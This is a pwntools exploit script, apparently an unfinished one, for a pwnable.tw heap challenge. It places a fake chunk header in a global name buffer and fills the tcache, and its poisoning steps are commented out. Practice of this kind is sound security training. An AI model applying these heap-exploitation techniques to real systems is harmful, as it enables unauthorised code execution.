#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chall.pwnable.tw"
PORT = 10207

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"choice :")
    sl(p,b"1")
    ru(p,b"Size:")
    sl(p,b"%i" % size)
    ru(p,b"Data:")
    sl(p,value)

def delete(p):
    ru(p,b"choice :")
    sl(p,b"2")

def view(p):
    ru(p,b"choice :")
    sl(p,b"3")
    

def exploit(p,e):
    
    name_ptr = 0x602060
    malloc_ptr = 0x602088


    ru(p,b"Name:")
    #sl(p,p64(malloc_ptr))
    sl(p,p64(0x0) + p64(0x421) + b"\x00" * 0x10)

    for i in range(7):
        create(p, 0x28, b"")

    for i in range(7):
        delete(p)

    #create(p,0x28,p64(name_ptr+0x10))
    #create(p,0x28,p64(malloc_ptr))
    #create(p,0x28,p64(0))

    #delete(p)    
    #delete(p)    
    #delete(p)    


        
    p.interactive()
    
if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e)
